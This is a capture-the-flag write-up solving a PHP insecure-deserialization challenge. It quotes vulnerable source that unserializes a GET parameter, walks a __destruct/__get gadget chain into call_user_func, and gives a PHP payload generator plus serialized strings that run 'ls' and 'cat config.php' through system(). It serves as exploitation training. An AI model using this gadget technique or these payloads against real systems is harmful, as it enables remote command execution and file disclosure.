## Description
Exploit this host: http://45.122.249.68:10001/

## Solution
### Observation
Open the URL, I got this source code:  
```php
<?php
#include "config.php";
class User{
    private $name;
    private $is_admin = false;
    public function __construct($name){
        $this->$name = $name;
    }
    public function __destruct(){
        if($this->is_admin === true){
            echo "hi admin, here is your flag";
        }
    }
}
class Show_color{
    public $color;
    public $type;
    public function __construct($type,$color){
        $this->type = $type;
        $this->color = $color;
    }
     public function __destruct(){
         call_user_func($this->type->adu,$this->color);
     }
}
class do_nothing{
    public $why;
    public $i_use_this;
    public function __construct($a,$b){
        $this->why = $a;
        $this->i_use_this = $b;
    }
    public function __get($method){
        if(isset($this->why)){
            return $this->i_use_this;
        }
        return $method;
    }
}
if(isset($_GET['code'])){
    unserialize($_GET['code']);
}
else{
    highlight_file(__FILE__);
}
?>
```

From the source code, I saw 2 things:  
- The `code` GET parameter is unserialized.  
- The class `Show_color`'s `__destruct` method uses `call_user_func`. The `call_user_func` is used to call a user's function as the name states. The first parameter of `call_user_func` is the function and the remaining parameters (if any) will be passed to that callback function.  

So I need `$this->type->adu` to be a function name and `$this->color` to be a parameter for that function.  

Looking at the `do_nothing` class, we have a `__get` method. In this method, if `$this->why` is set, it returns `$this->i_use_this`; otherwise, `$method` is returned. From here, I thought if `type` in `$this->type->adu` is of type `do_nothing`, `$this->type->adu` will invoke the `__get` method of `do_nothing`. And if I can make this `__get`method return the function name that I want, it will be amazing.  

To make that possible, what I need to do is set something to `$this->why` for a `do_nothing` object and set the function name that I want to invoke to the `$this->i_use_this` attribute.  

So which function do I want to use? - `system()`.  

The reason is that `exec()` and `shell_exec()` do execute a given command but they return the output as a string. For this reason, if I want to *see* the result, I need to `echo` it, which makes things more complicated in this challenge. `system()`, on the other hand, executes a given command, display the result directly, and return the result as a string.  

### Exploit
First, I want to `ls` all the files and directories on the server. So I need to call `system("ls")`. Follow is my script to create a serialized `Show_color` object which will cause the server to execute `ls` on deserialization:
```php
<?php
class Show_color{
    public $color;
    public $type;
}
class do_nothing{
    public $why;
    public $i_use_this;
}

$dn = new do_nothing();
$dn->why = true;
$dn->i_use_this = 'system';

$sc = new Show_color();
$sc->type = $dn;
$sc->color = 'ls';

echo serialize($sc);
?>
```

Run the script to get the serialized string:
```sh
╰─ php ./script.php
O:10:"Show_color":2:{s:5:"color";s:2:"ls";s:4:"type";O:10:"do_nothing":2:{s:3:"why";b:1;s:10:"i_use_this";s:6:"system";}}
```

Send a GET request to the server with `code=O:10:"Show_color":2:{s:5:"color";s:2:"ls";s:4:"type";O:10:"do_nothing":2:{s:3:"why";b:1;s:10:"i_use_this";s:6:"system";}}` and I got `config.php` and `index.php`:  

![image](https://user-images.githubusercontent.com/44528004/138098238-2ea440ed-d0e6-4166-b2aa-904af2eaeca5.png)  

Next, I modify the script a little bit to `cat config.php`.
```php
<?php
class Show_color{
    public $color;
    public $type;
}
class do_nothing{
    public $why;
    public $i_use_this;
}

$dn = new do_nothing();
$dn->why = true;
$dn->i_use_this = 'system';

$sc = new Show_color();
$sc->type = $dn;
$sc->color = 'cat config.php';

echo serialize($sc);
?>
```

The serialized string now is:
```
O:10:"Show_color":2:{s:5:"color";s:14:"cat config.php";s:4:"type";O:10:"do_nothing":2:{s:3:"why";b:1;s:10:"i_use_this";s:6:"system";}}
```

Send to the server and get the flag.  

![image](https://user-images.githubusercontent.com/44528004/138098602-c018e40b-df29-422a-8311-82e7b6194480.png)
> Flag: `flag{n0j_l0j_pk4j_qju_l4y_l0j_dunq_nku_c0n_bu0m_d4u_r0j_l4j_b4y}`.  
